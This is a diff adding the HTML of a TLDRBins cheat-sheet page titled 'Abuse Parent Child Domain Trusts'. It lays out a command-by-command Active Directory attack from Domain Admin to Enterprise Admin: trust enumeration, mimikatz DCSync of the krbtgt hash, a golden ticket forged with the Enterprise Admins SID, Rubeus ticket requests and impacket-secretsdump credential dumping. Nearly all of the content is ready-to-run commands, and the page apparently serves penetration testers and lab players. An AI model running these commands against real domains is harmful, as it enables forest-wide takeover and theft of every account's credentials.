@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Abuse Parent Child Domain Trusts | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/abuse_parent_child_domain_trusts/">
+      <span>Abuse Parent Child Domain Trusts</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@kerberos/">Kerberos</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@da/">Da</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@ea/">Ea</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@ad/">Ad</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@domain-controller/">Domain Controller</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@golden-ticket/">Golden Ticket</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@privesc/">Privesc</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@mimikatz/">Mimikatz</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@rubeus/">Rubeus</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@trusts/">Trusts</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="privesc-from-da-to-ea">Privesc from DA to EA</h3>
+<h4 id="check-direction-and-target">Check direction and target</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">*</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Or</span>
+</span></span><span class="line"><span class="cl"><span class="n">nltest</span> <span class="p">/</span><span class="n">domain_trusts</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Or</span>
+</span></span><span class="line"><span class="cl"><span class="p">([</span><span class="no">System.DirectoryServices.ActiveDirectory.Domain</span><span class="p">]::</span><span class="n">GetCurrentDomain</span><span class="p">()).</span><span class="py">GetAllTrustRelationships</span><span class="p">()</span>
+</span></span></code></pre></div><h4 id="get-current-and-target-domain-sid">Get current and target domain SID</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">./</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s1">&#39;lsadump::trust&#39;</span> <span class="s1">&#39;exit&#39;</span>
+</span></span></code></pre></div><h4 id="get-krbtgt-hash-of-current-domain">Get krbtgt hash of current domain</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">./</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s1">&#39;lsadump::dcsync /all /csv&#39;</span> <span class="s1">&#39;exit&#39;</span>
+</span></span></code></pre></div><h4 id="forge-a-golden-ticket">Forge a golden ticket</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Append &#39;-519&#39; to target domain SID</span>
+</span></span><span class="line"><span class="cl"><span class="p">./</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s1">&#39;kerberos::golden /user:Administrator /rc4:&lt;HASH&gt; /domain:CURRENT.EXAMPLE.COM /sid:&lt;CURRENT_DOMAIN_SID&gt; /sids:&lt;TARGET_DOMAIN_SID&gt;-519 /ticket:c:\windows\tasks\ticket.kirbi&#39;</span> <span class="s1">&#39;exit&#39;</span>
+</span></span></code></pre></div><p><small><em>Note: May need to try different high value hashes</em></small></p>
+<h4 id="request-a-tgt-ticket-of-target-domain">Request a tgt ticket of target domain</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">./</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">TARGET</span><span class="p">.</span><span class="py">EXAMPLE</span><span class="p">.</span><span class="py">COM</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">EXAMPLE</span><span class="p">.</span><span class="py">COM</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="n">DC01</span><span class="p">.</span><span class="py">EXAMPLE</span><span class="p">.</span><span class="py">COM</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">tasks</span><span class="p">\</span><span class="n">ticket</span><span class="p">.</span><span class="py">kirbi</span> <span class="p">/</span><span class="n">outfile</span><span class="err">:</span><span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">tasks</span><span class="p">\</span><span class="n">ticket_2</span><span class="p">.</span><span class="py">kirbi</span> <span class="p">/</span><span class="n">nowrap</span>
+</span></span></code></pre></div><h4 id="convert-kirbi-to-ccache-back-to-linux">Convert kirbi to ccache (Back to Linux)</h4>
+<p><a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 rubeustoccache.py &lt;base64_encoded_ticket&gt; secrets.kirbi secrets.ccache
+</span></span></code></pre></div><h4 id="secretdump">secretdump</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>secrets.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump administrator@target.example.com -k -no-pass
+</span></span></code></pre></div><br></div></div>
+    
+    <script src="/js/utils.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
